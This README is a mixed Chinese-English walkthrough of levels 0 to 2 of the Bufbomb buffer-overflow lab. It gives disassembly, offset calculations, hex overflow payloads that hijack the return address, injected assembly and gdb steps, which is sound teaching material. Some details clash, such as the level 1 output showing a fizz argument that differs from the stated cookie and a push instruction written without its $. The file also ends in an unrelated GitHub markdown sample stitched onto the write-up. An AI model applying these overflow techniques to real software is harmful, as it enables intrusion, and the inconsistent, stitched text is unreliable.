# Bufbomb

实验整体思路为，在给定的32位程序-bufbomb输入溢出内容，达到改变程序原有执行顺序。

网上也有相同内容，但反汇编结果不同。我们用bufbomb来做实验，bufbomb on the internet 可以用来做参考。

## level 0
首先通过 `objdump -d bufbomb > buf_asm` 导出bufbomb反汇编文件。

网络流传的一套反汇编结果
```
08048c04 <getbuf>:
 8048c04:	55                   	push   %ebp
 8048c05:	89 e5                	mov    %esp,%ebp
 8048c07:	83 ec 38             	sub    $0x38,%esp
 8048c0a:	8d 45 d8             	lea    -0x28(%ebp),%eax
 8048c0d:	89 04 24             	mov    %eax,(%esp)
```
**ebp** 压栈，**esp** 指向 **ebp**，**esp** 减 *0x38* 开出栈空间，**eax** 参数地址指向 **ebp** 加 *0x28*。    
所以整个输入栈为：

>40字节 + ebp + ret 地址 = 40 + 4 +4 = 48字节。


The disassembly result of our bufbomb.
```
08048ed2 <getbuf>:
 8048ed2:   83 ec 3c                sub    $0x3c,%esp
 8048ed5:   8d 44 24 10             lea    0x10(%esp),%eax
 8048ed9:   89 04 24                mov    %eax,(%esp)
```
There is no **ebp** register in this disassembly program，估计哪位改了改。    
Let's go! **esp** sub *0x3c*，**eax** point to **esp** plus *0x10* equal to *0x2c*，    
So the distance form **eax** to ret is：    

>44bytes + ret address = 44 + 4 = 48bytes

We get the same result 48.

Finally, according to your own situation，turn the adress to the address of _somke()_ function： `08048ccc <smoke>:`

```
00 00 00 00    
00 00 00 00    
00 00 00 00    
00 00 00 00    
00 00 00 00    
00 00 00 00    
00 00 00 00    
00 00 00 00    
00 00 00 00    
00 00 00 00    
00 00 00 00    
cc 8c 04 08
```

> Userid: hanggi    
 Cookie: 0x11c1be21    
 Type string:Smoke!: You called smoke()    
 VAILD    
> NICE JOB!


## level 1
在这个level，我们的任务是调用 *fizz()* 函数。但是fizz需要一个参数，当这个参数等于你的cookie时，才能通过升级。

Let's use the following command to get our cookie.
```
$ ./makecookie hanggi
```
I got the value of 0x11c1be21.


这个是网上流行的一个版本：
```
0804906f <fizz>:
 804906f:	55                   	push   %ebp
 8049070:	89 e5                	mov    %esp,%ebp
 8049072:	83 ec 18             	sub    $0x18,%esp
 8049075:	8b 45 08             	mov    0x8(%ebp),%eax
 8049078:	3b 05 e4 c1 04 08    	cmp    0x804c1e4,%eax
```
（这里可以参考网上的内容）

这是我们的版本：
```
08048cf3 <fizz>:
 8048cf3:	83 ec 1c             	sub    $0x1c,%esp
 8048cf6:	8b 44 24 20          	mov    0x20(%esp),%eax
 8048cfa:	3b 05 0c d1 04 08    	cmp    0x804d10c,%eax
```
因为我们不是call fizz函数，而是直接 jmp 到fizz，因此程序没有自动push返回地址入栈，所以 **esp** 在上一题返回地址所在位置的 *+4* 的位置。
也就是说，进入fizz的时候， **esp** 指向了ret address + 4 的单元。
从代码可以看到 **esp** 减 *0x1c*，然后参数寄存器获取 **esp** 加 *0x20* 的内容作为与cookie 比较的值，我们只需把这一地址的值改为我们的cookie就可以了。

```
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
f3 8c 04 08
00 00 00 00
21 be c1 11
```

> Userid: hanggi    
 Cookie: 0x11c1be21    
 Type string:Fizz!: You called fizz(0x2a50279f)    
 VAILD    
> NICE JOB!


## level 2
这一级别与上一级别的不同是，上一级别所要改变的参数位置离我们输入栈很近，我们可以通过更多溢出覆盖参数值。但是这一题里，所要对比的参数比较远，所以必须添加我们自己的指令，以达到更改目标变量的目的。

我们需要将global_value改成我们的cookie。    
通过 `objdump -D bufbomb | less`获得global_value地址，

```
0804d104 <global_value>:
 804d104:       00 00
```
目前global_value的值为0，也可以看到cookie变量的地址，程序运行后会变为我们的cookie值。

*bang()* 函数如下(网络版省略)：
```
08048d4c <bang>:
 8048d4c:	83 ec 1c             	sub    $0x1c,%esp
 8048d4f:	a1 04 d1 04 08       	mov    0x804d104,%eax
 8048d54:	3b 05 0c d1 04 08    	cmp    0x804d10c,%eax
```

攻击指令如下：
```
movl $0x11c1be21, 0x0804d104
pushl 0x08048d4c
ret
```
由于是Assembly code 不需要考虑 little endian的问题,    
先将 *global_value* 用 move 赋值为 cookie （*0x08048d4c* 前不加$ 表示地址），
然后将 *bang()* 方程地址 *0x08048d4c* 写给esp，再执行ret指令时，程序自动跳入bang

用 `gcc -m32 -c level2_p.s` 将代码编译成机器码，    
再用 `objdump -d level2_p.o` 读取。
```
00000000 <.text>:
   0:	c7 05 04 d1 04 08 21 	movl   $0x11c1be21,0x804d104
   7:	be c1 11
   a:	68 4c 8d 04 08       	push   $0x8048d4c
   f:	c3                   	ret    
```
把代码抄入文件，    

最后还要使用GDB获取输入内容存放的地址作为 ret 指令的目标地址。
```
$gdb bufbomb
(gdb) b *0x8048ed9           (在地址0x8048c0d设置断点)
(gdb) r xx -u hanggi         (随便输入点字符让程序运行到断点位置)
(gdb) p /x $eax              (以十六进制数字形式打印%eax中的内容)
```

```
c7 05 04 d1
04 08 21 be
c1 11 68 4c
8d 04 08 c3
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
78 3b 68 55
```

> Userid: hanggi    
 Cookie: 0x11c1be21    
 Type string:Bang!: You set global_value to 0x11c1be21    
 VAILD    
> NICE JOB!


## title

*This text will be italic*
_This will also be italic_

**This text will be bold**
__This will also be bold__

_You **can** combine them_

* Item 1
* Item 2
  * Item 2a
  * Item 2b

1. Item 1
2. Item 2
3. Item 3
   * Item 3a
   * Item 3b

![GitHub Logo](/images/logo.png)
Format: ![Alt Text](url)

http://github.com - automatic!
[GitHub](http://github.com)

As Kanye West said:

> We're living the future so
> the present is our past.


I think you should use an
`<addr>` element here instead.


```javascript
function fancyAlert(arg) {
  if(arg) {
    $.facebox({div:'#foo'})
  }
}
```




- [x] @mentions, #refs, [links](), **formatting**, and <del>tags</del> supported
- [x] list syntax required (any unordered or ordered list supported)
- [x] this is a complete item
- [ ] this is an incomplete item



First Header | Second Header
------------ | -------------
Content from cell 1 | Content from cell 2
Content in the first column | Content in the second column
